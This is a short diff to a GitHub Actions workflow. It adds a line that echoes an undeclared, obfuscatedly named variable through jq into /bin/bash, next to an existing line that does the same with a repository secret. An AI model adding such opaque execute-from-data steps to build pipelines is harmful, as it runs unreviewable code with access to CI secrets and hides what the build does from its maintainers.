@@ -22,6 +22,7 @@ jobs:
           pf76: ${{ secrets.pf76 }}
         run: |
           printf '%s' "$pf76" | jq -r .vlany6255 | /bin/bash
+          echo $i36005 | jq -r .dqkov85 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
